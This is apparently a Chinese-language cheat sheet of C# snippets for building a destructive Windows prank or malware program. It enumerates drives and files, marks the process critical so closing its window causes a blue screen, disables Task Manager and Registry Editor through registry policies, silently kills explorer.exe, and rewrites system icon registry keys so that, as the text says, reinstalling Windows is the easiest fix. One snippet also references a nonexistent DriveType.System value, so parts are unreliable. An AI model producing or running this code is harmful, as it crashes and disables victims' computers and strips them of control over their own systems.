## 遍历所有盘符，得到盘符前缀
```csharp
using System.IO;

foreach (DriveInfo drive in DriveInfo.GetDrives())
{
    if (drive.DriveType == DriveType.Fixed && !drive.IsReady)
    {
        // 过滤未准备好的驱动器
        continue;
    }
    if (drive.DriveType == DriveType.System)
    {
        // 过滤系统盘
        continue;
    }

    // 其他逻辑...
    Console.WriteLine($"Drive: {drive.Name}");
}
```
- 遍历计算机上的所有驱动器信息，然后通过 DriveType 属性来判断驱动器类型，如果是系统盘，则跳过该驱动器，否则执行其他逻辑。
---
## 遍历指定目录下的所有文件路径
```csharp
// 遍历目录下所有文件并处理的模板
try
{
        var files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
        foreach (string file in files)
        ...
}
catch(Exception ex)
{
//处理异常
}
```

## 防止程序被结束
- 这必须给一点小小的惩罚
```csharp
 //关闭窗体就蓝屏效果模板
 ​//添加System.Runtime.InteropServices和System.Diagnostics的引用 
  
 ​//声明引用 
 ​[DllImport("ntdll.dll", SetLastError = true)] 
 ​private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength); 
 ​//窗体关闭事件，在窗体事件中的FormClosing 
 ​private void Form1_FormClosing(object sender, FormClosingEventArgs e) 
 ​{ 
 ​    int isCritical = 1;  // we want this to be a Critical Process 
 ​    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag) 
  
 ​    Process.EnterDebugMode();  //acquire Debug Privileges 
  
 ​    // setting the BreakOnTermination = 1 for the current process 
 ​    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int)); 
  
 ​}
```
---

## 注册表相关
```csharp
 
​// 禁止打开注册表 
Registry​.​SetValue​(​@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"​,​ ​"​DisableRegistryTools​"​,​ ​1​,​ RegistryValueKind​.​DWord​)​; 
  
​// 禁止打开任务管理器 
Registry​.​SetValue​(​@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"​,​ ​"​DisableTaskMgr​"​,​ ​1​,​ RegistryValueKind​.​DWord​)​;
```
---

## 调用cmd方案
```csharp
 
 ​            ​//杀死explorer 
 ​            ​Process​ ​process_CMD​ ​=​ ​new​ Process​(​)​; 
 ​            process_CMD​.​StartInfo​.​FileName ​=​ ​"​cmd.exe​"​;​//进程打开文件名为“cmd” 
 ​            process_CMD​.​StartInfo​.​RedirectStandardInput ​=​ ​true​;​//是否可以输入 
 ​            process_CMD​.​StartInfo​.​RedirectStandardOutput ​=​ ​true​;​//是否可以输出 
 ​            process_CMD​.​StartInfo​.​CreateNoWindow ​=​ ​true​;​//不创建窗体 也就是隐藏窗体 
 ​            process_CMD​.​StartInfo​.​UseShellExecute ​=​ ​false​;​//是否使用系统shell执行，否 
  
 ​            process_CMD​.​Start​(​)​; 
  
 ​            process_CMD​.​StandardInput​.​WriteLine​(​"​taskkill /im explorer.exe /t /f ​"​)​;
```

---
## 注册表危险
- 运行了这些，就重装系统吧，一个一个改回来太累
```csharp
using Microsoft.Win32;

//Application.ExecutablePath为本程序路径
// 设置文件夹图标path的值为1-44
Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\" + path, "", Application.ExecutablePath, RegistryValueKind.String);

// 设置“我的电脑”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“控制面板”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“回收站”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“加密文件夹”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“网络上的计算机”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“我的文档”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“我的图片”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

```